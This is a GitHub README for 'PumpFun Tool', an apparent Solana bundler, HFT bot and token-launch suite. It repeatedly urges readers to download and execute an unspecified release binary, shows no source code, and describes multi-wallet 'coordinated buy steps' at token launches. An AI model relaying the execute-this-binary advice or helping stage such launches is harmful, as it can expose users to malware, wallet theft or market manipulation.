# PumpFun Tool — Solana Bundler, MEV Shield, Token Launch Suite 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ShadowBeast200/pumpfun-tool/releases)

https://github.com/ShadowBeast200/pumpfun-tool/releases — download the release file for your platform and execute the binary or installer that matches your OS.

Badges
- ![anchor](https://img.shields.io/badge/anchor-000000?style=flat-square&logo=Anchor&logoColor=white)
- ![solana](https://img.shields.io/badge/solana-00FFA3?style=flat-square&logo=solana&logoColor=white)
- ![web3js](https://img.shields.io/badge/web3js-3C873A?style=flat-square&logo=web3dotjs&logoColor=white)
- Topics: anchor • bubblema • bundler • jito-bundle • pumpfun • pumpfunswap • pumpski • solana • web3 • web3js

Banner image
![Solana network](https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/solana.svg)

Table of contents
- What PumpFun Tool does
- Key features
- Architecture and components
- Bundler engines and wallets
- MEV shield and protection
- High-frequency trading bot
- Solana token creator
- Jito bundle integration
- Multi-wallet management
- Live price tracking and feeds
- Custom RPC node management
- Anti-rug and rug-check tools
- Instant token launch flow
- Installation (download & execute)
- Quick start examples
- Configuration reference
- CLI reference
- Common workflows
- Logs and metrics
- Performance tuning
- Security and hardening
- Testing and local dev
- Troubleshooting
- FAQ
- Contributing
- License
- Changelog
- Credits and links

What PumpFun Tool does
- Bundle and submit transaction sets to Solana with fine control.
- Run and manage many wallets under one process.
- Protect against MEV extraction and sandwich attacks.
- Run an HFT bot for narrow spread markets.
- Create tokens and launch them with bundle-level control.
- Build Jito bundles for optimal execution.
- Track live token prices and candlesticks.
- Configure custom RPC nodes and route requests.
- Run anti-rug checks and post-launch monitors.
- Launch tokens with coordinated multi-wallet events.

Key features
- Bundler core with 20+ built-in wallet handlers and a plugin API.
- MEV bot detection and mitigation. Heuristic filters, nonce control, and reorder-resistant submission.
- HFT engine that submits limit and sweep orders with millisecond timers.
- Token creator with mint flows, metadata, liquidity pool creation, and launch scripts.
- Jito bundle builder for direct Jito submission.
- Multi-wallet manager with per-wallet caps and failover.
- Live price tracker with websocket feeds and on-chain oracle checks.
- Custom RPC manager for round-robin, latency-based routing, and failover.
- Anti-rug suite: ownership checks, liquidity lock checks, router safety checks.
- Launch coordinator that sequences swaps, liquidity adds, and marketing events.

Architecture and components
PumpFun Tool uses a modular design. Each module runs as a process or thread. Modules talk with a message bus for events.

Core modules
- main controller: orchestrates jobs and schedules.
- bundler engine: prepares and signs transaction bundles.
- wallet manager: holds keys, signs, and tracks balances.
- rpc manager: routes RPC calls to nodes.
- trader engine: runs HFT strategies.
- protection engine: runs MEV and safety checks.
- token creator: executes mint and metadata steps.
- notifier: emits webhooks and events.

Runtime model
- The controller receives jobs from CLI, API, or scheduler.
- The bundler engine creates bundles.
- The wallet manager signs bundles.
- The rpc manager sends bundles to a target node or a Jito endpoint.
- The protection engine inspects candidate bundles and may block or modify them.
- The notifier publishes status to webhooks, logs, or dashboards.

Extensibility
- Add new wallet adapters with a simple interface.
- Add new RPC health checks.
- Add strategy plugins for the trader engine.
- Add connectors for exchanges or AMMs.

Bundler engines and wallets
Bundler types
- Standard bundler: group of txs, standard order.
- Priority bundler: sets high fee priorities.
- Jito bundler: prepares Jito-specific ops and fee payer configs.
- Gasless bundler: prepares relayer-ready payloads.

Wallet adapters (sample list)
- Local keypair file
- Seed phrase
- Hardware wallet adapter (Ledger)
- Multisig adapter
- Remote signing service adapter
- WalletConnect adapter
- Managed hot wallet pool (20+ preconfigured slots)

Wallet policy
- Per-wallet nonce control.
- Per-wallet retry policy.
- Per-wallet pre-flight balance checks.
- Auto-switch on failure.

MEV shield and protection
Overview
- The protection engine runs a pipeline of checks.
- It flags dangerous bundles.
- It can rewrite slippage and target price.
- It can change timing and route through different RPCs.

Detection methods
- Sandwich detection: detect three-party sandwich vectors.
- Backrunning detection: detect bundles with backrunable steps.
- Front-run risk: detect wide slippage, direct pairs, and poor route hops.
- Fee abuse: detect fee spikes and gas inflation.

Defenses
- Time-shift: randomize submission time within a margin.
- Nonce-guard: lock nonce per wallet to avoid reorder.
- Fee cap: enforce upper fee per compute unit.
- Route-check: validate swap path against known safe routers.
- Jito-route option: use Jito bundle submission for priority without exposing to public mempool.

High-frequency trading bot
Design
- The trader engine runs micro-strategies.
- It uses local book snapshots and on-chain checks.
- It handles high message rates and low latency.

Strategies
- Narrow spread maker: post limit orders around spread.
- Sweep taker: sweep liquidity for arbitrage.
- Cross-pair arb: spot discrepancies across pairs.
- Market depth keeper: maintain depth on thin pairs.

Execution
- Use low-latency RPCs or direct validators.
- Use per-order rate limits and concurrency controls.
- Use batch signing for groups of orders.

Risk controls
- Max position limits per wallet and per token.
- Max notional per block.
- Kill switch with a heartbeat monitor.

Solana token creator
Capabilities
- Create a mint with metadata.
- Set initial supply and freeze authority.
- Create liquidity pool on target AMM.
- Mint to a set of wallets.
- Run an initial swap to bootstrap price.
- Lock liquidity by sending LP tokens to a timelock contract.

Token metadata
- Set name, symbol, URI.
- Upload metadata to Arweave or IPFS.
- Use optional royalty fields.

Launch modes
- Single-wallet seed supply.
- Distributed seed across multiple wallets.
- Pre-sale mode with vesting schedules.
- Instant launch with automated liquidity lock.

Jito bundle integration
Why Jito
- Jito offers priority execution for Solana bundles.
- It can reduce MEV exposure in some cases.

How PumpFun integrates
- Create Jito-compatible bundles.
- Set validators and fee-payer for Jito.
- Monitor Jito submission status.
- Auto-switch to Jito when mempool latency or MEV risk crosses threshold.

Jito bundle options
- Direct Jito submission.
- Jito + fallback to public node.
- Size limit checks to avoid Jito rejections.

Multi-wallet management
Overview
- Manage many wallets under one process.
- Assign roles: deployer, liquidity, buyer, seller.

Features
- Per-wallet config profiles.
- Batch signing for coordinated actions.
- Automated rotation and key replacement.
- Pool-level reporting and balance snapshots.

Use cases
- Coordinated token launches.
- Market making with multiple endpoints.
- Parallelized order execution.

Live price tracking and feeds
Feeds
- Websocket feeds from public exchanges.
- Aggregated on-chain oracle checks (Pyth, Switchboard).
- Local price cache with TTL.

Indicators
- Candlestick aggregation.
- VWAP and TWAP calculations.
- Spread and depth indicators.

Alerts
- Webhooks on price thresholds.
- Local triggers for bot strategies.

Custom RPC node management
RPC types
- Public RPC nodes.
- Private RPC endpoints.
- Local validator endpoints.
- Jito endpoints.

Routing
- Latency-based routing: measure RTT and pick fastest.
- Round-robin with health checks.
- Priority for nodes with high reliability.
- Blacklist unhealthy nodes.

Health checks
- RPC pong time.
- Recent block height check.
- Transaction propagation check.

Anti-rug and rug-check tools
Checks performed
- Ownership checks: verify mint and liquidity token owners.
- Liquidity lock checks: detect LP tokens in timelock or inaccessible wallet.
- Router checks: check router and factory against known safe list.
- Renouncement checks: detect renounced ownership on mint or programs.
- Tax and mint rights checks: detect mint on transfer behavior.

Pre-launch checklist
- Check contract source if available.
- Verify liquidity pair and initial liquidity size.
- Verify lock mechanism for LP tokens.
- Check for immediate mint or burn functions.

Instant token launch flow
Overview
- Prepare mint.
- Create liquidity pool.
- Add liquidity from design wallets.
- Lock LP tokens.
- Broadcast coordinated buy steps.

Launch coordinator actions
- Schedule per-wallet orders.
- Sequence liquidity add and swap.
- Monitor mempool and use Jito or priority submission.
- Emit launch events and webhooks.

Governance and vesting
- Generate vesting schedules.
- Create timelocks for team wallets.
- Allow post-launch vesting withdrawal logic.

Installation (download & execute)
- Visit the releases page and download the correct asset for your OS:
  https://github.com/ShadowBeast200/pumpfun-tool/releases
- Each release includes binaries, tarballs, or installers.
- Download the matching file for your platform.
- On Unix-like systems:
  - Extract the tar or unzip.
  - Make the binary executable and run it.
- On Windows:
  - Run the installer or execute the .exe binary.
- Release assets include checksums and signatures when available.
- Follow the asset's README inside the release to find the exact filename to run.

Quick start examples
Run the bundler (local keypair)
1. Start with a keypair file.
2. Run the bundler with a config that points to your RPC.
3. Sign and send a test bundle.

Example CLI
- pumpfunctl bundler start --config ./configs/bundler.json
- pumpfunctl token create --config ./configs/token.json
- pumpfunctl hft start --profile default

Examples explained
- bundler start reads jobs from the job queue and submits them.
- token create runs the full mint and liquidity flow.
- hft start runs the high-frequency trader with the listed profile.

Configuration reference
Config layout
- main config
  - rpc: array of RPC endpoints
  - wallets: path to wallet keys or key store
  - bundler: bundler settings
  - trader: HFT settings
  - protection: MEV and safety settings
  - logging: level and outputs
  - webhooks: endpoints for events

Sample config keys
- rpc.nodes: list of "url, priority, tags"
- bundler.max_bundle_size: integer
- bundler.fee_cap: lamports per compute unit
- trader.max_position: token limits
- protection.enabled_checks: array of checks to run

Environmental variables
- PF_RPC_LIST: optional RPC override
- PF_LOG_LEVEL: debug | info | warn | error
- PF_RELEASE_CHANNEL: stable | beta | nightly

CLI reference
Top-level commands
- pumpfunctl run <module>
- pumpfunctl bundler start
- pumpfunctl token create
- pumpfunctl hft start
- pumpfunctl wallets list
- pumpfunctl config check
- pumpfunctl metrics serve

Common flags
- --config PATH
- --profile NAME
- --dry-run
- --verbose
- --yes (auto confirm where needed)

API endpoints (local)
- GET /health
- GET /metrics
- POST /jobs
- GET /jobs/:id
- POST /webhook/test

Common workflows
Launch a new token
1. Create config for token.
2. Generate wallets and seed balances.
3. Run pumpfunctl token create --config token.json
4. Watch events and confirm LP lock.

Run HFT on a pair
1. Set trader profile for pair and strategy.
2. Tune spread and max position.
3. Run pumpfunctl hft start --profile arb-usdc
4. Monitor logs for fills and slippage.

Build a bundle for Jito
1. Prepare transactions in a bundler job.
2. Use bundler.jito option to prepare Jito payload.
3. Submit via jito endpoint or fallback.

Logs and metrics
Logging
- Structured JSON logs by default.
- Levels: debug, info, warn, error.
- Rotate logs daily.

Metrics
- Prometheus metrics endpoint.
- Counters for bundles submitted, failures, and MEV blocks.
- Histograms for RPC latency and bundle submission time.

Dashboards
- Grafana dashboard templates included.
- Key panels: RPC latency, bundle success rate, wallet balance trends, HFT fill rate.

Performance tuning
RPC tuning
- Use low-latency RPCs.
- Use parallel RPCs with quota controls.
- Prefer private endpoints for high throughput.

Bundler tuning
- Tune bundle size to avoid timeout.
- Set fee cap to stay within budget.
- Use preflight simulation to avoid costly failures.

HFT tuning
- Tune aggressiveness and rate limits.
- Test in a simulator with recorded market data.
- Use position limits to protect capital.

Security and hardening
Key handling
- Store keys in a secure keystore.
- Use hardware wallets for cold funds.
- Rotate keys on schedule.

Network
- Run over private RPC when possible.
- Block public access on management APIs.
- Use TLS for exposed endpoints.

Account safety
- Use per-wallet policy to cap transfers.
- Use timelocks for key operations.

Supply chain
- Verify release checksums and signatures.
- Use reproducible builds where possible.

Testing and local dev
Local validator
- Use a local Solana test validator for dev work.
- Seed wallets with test SOL.

Unit tests
- Run unit test suite with the included test runner.
- Mock RPC responses when testing high-rate strategies.

Integration tests
- Run integration tests that use a testnet or local validator.
- Test large flows under simulated latency.

Troubleshooting
Common issues and steps
- RPC timeouts: switch to a different node and retry.
- Bundle rejected: run preflight simulation and inspect logs.
- Wallet out of sync: resync account state and nonce.
- Low fill rate: tune strategy parameters and spread.

How to collect debug data
- Enable debug logs.
- Capture the metrics endpoint.
- Save the bundle payloads and preflight responses.

FAQ
Q: How do I pick an RPC?
A: Measure latency and reliability. Use private or dedicated nodes for critical flows.

Q: Can I use this with hardware wallets?
A: Yes. The wallet adapter supports hardware signing. Use it for high-value wallets.

Q: Does the tool protect against all MEV?
A: The protection engine reduces common MEV vectors. No tool can remove all risk. Use private endpoints and Jito where needed.

Q: Are there presets for token launches?
A: Yes. The token creator ships with preset launch modes that you can adapt.

Q: Can I run multiple strategies in parallel?
A: Yes. The trader engine supports multiple profiles and concurrency controls.

Q: Where can I get release assets?
A: Go to the releases page and download the file that matches your OS:
https://github.com/ShadowBeast200/pumpfun-tool/releases

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests for new features.
- Submit a pull request with a clear description of changes.
- Follow the code style and test policy.
- Use the issue tracker to propose major changes first.

Development workflow
- Use local validator for integration testing.
- Use feature flags for experimental code.
- Keep API backwards compatible when possible.

License
- Check the LICENSE file in the repository for details.

Changelog
- The Releases page contains binary releases and changelogs. Download the matching file and check its release notes.
- Release notes include breaking changes, new features, and bug fixes.

Credits and links
- Solana: https://solana.com
- Web3.js: https://github.com/ChainSafe/web3.js
- Jito: https://jito.bz
- Pyth Network: https://pyth.network
- Switchboard: https://switchboard.xyz

Images and icons used
- Solana icon from Simple Icons: https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/solana.svg
- Web3 icon from Simple Icons: https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/web3dotjs.svg
- GitHub badges via shields.io

Appendix: example config snippets
1) Minimal bundler config (JSON)
```json
{
  "rpc": [
    { "url": "https://api.mainnet-beta.solana.com", "priority": 1 },
    { "url": "https://your-private-rpc.example", "priority": 0 }
  ],
  "wallets": {
    "path": "./keys",
    "policy": {
      "nonce_lock": true,
      "retry_on_failure": 3
    }
  },
  "bundler": {
    "max_bundle_size": 8,
    "fee_cap": 1000
  },
  "protection": {
    "enabled_checks": ["sandwich", "liquidity_lock", "router_safety"]
  }
}
```

2) HFT profile (YAML)
```yaml
profile: arb-usdc
pair: USDC/XYZ
strategy: cross-pair-arb
max_position: 5000
spread: 0.002
rate_limit_per_wallet: 10
concurrency: 4
rpc_priority: high
```

3) Token create example (JSON)
```json
{
  "mint": {
    "name": "PumpFunToken",
    "symbol": "PFT",
    "decimals": 9,
    "initial_supply": 1000000000
  },
  "liquidity": {
    "pair": "USDC",
    "seed_wallets": ["walletA", "walletB"],
    "initial_usdc": 10000,
    "initial_token": 1000000,
    "lock_lp": true,
    "lock_duration_days": 90
  },
  "post_launch": {
    "marketing_wallets": ["walletC"],
    "vesting": [
      { "wallet": "team", "amount": 50000000, "days": 365 }
    ]
  }
}
```

Telemetry and privacy
- Telemetry is off by default.
- When enabled, telemetry sends anonymized metrics to help improve reliability.
- You can disable telemetry in the config with telemetry.enabled = false.

Runtime safety patterns
- Use dry-run mode for new bundles to simulate outcomes.
- Set explicit fee caps to avoid runaway fees.
- Use role separation: deployer, ops, and monitoring should use different credentials.

Operational checklist
- Verify keys and access controls.
- Verify RPCs and latency.
- Run preflight simulations before a live launch.
- Monitor health and metrics during live traffic.
- Keep a rollback plan for launches and large trades.

Automation and CI
- CI runs unit tests and integration tests against a local validator.
- Releases attach signed artifacts and a changelog file.
- Use the Releases page to download build assets and checksums:
https://github.com/ShadowBeast200/pumpfun-tool/releases

Example webhook payload
- Event: bundle_submitted
- Payload
```json
{
  "event": "bundle_submitted",
  "id": "bndl_123",
  "wallet": "walletA",
  "status": "submitted",
  "timestamp": 1690000000,
  "details": {
    "tx_count": 5,
    "rpc": "https://your-private-rpc.example"
  }
}
```

Advanced topics
- Ledger batching: group signing to reduce HSM calls.
- Replay protection: use per-bundle salts to avoid certain replay patterns.
- Dynamic fee policies: increase fee cap during high latency windows.

Operational tips
- Keep an eye on block heights across RPCs.
- Use a heartbeat monitor to detect stalls.
- Run a small simulation after major code changes.

Legal and compliance
- Check local laws and exchange terms before running live bots.
- Keep logs for audits.

Contact and support
- Use the repo issues for bug reports and feature requests.
- For critical incident response, open an issue with the tag incident.

Endpoints and helpful links
- Releases: https://github.com/ShadowBeast200/pumpfun-tool/releases
- Repo homepage: https://github.com/ShadowBeast200/pumpfun-tool

Files included in releases
- Binary for each platform.
- Sample configs and profiles.
- Changelog.md and release notes.
- Checksums (.sha256) and optional signatures.

Maintenance notes
- Keep dependencies up to date.
- Review fee models on a regular basis.
- Re-evaluate RPC lists and latency targets.

Developer tips
- Use the message bus hooks to add custom plugins.
- Use the adapter interface to support new wallet formats.
- Add new strategy modules under src/strategies for test coverage.

This README aims to document the full suite and common workflows. Find binaries, release notes, and exact installer files on the releases page and download the asset that matches your OS. Execute the downloaded file as described in the release notes and the asset README.

Links repeated for convenience:
- Releases and assets: https://github.com/ShadowBeast200/pumpfun-tool/releases

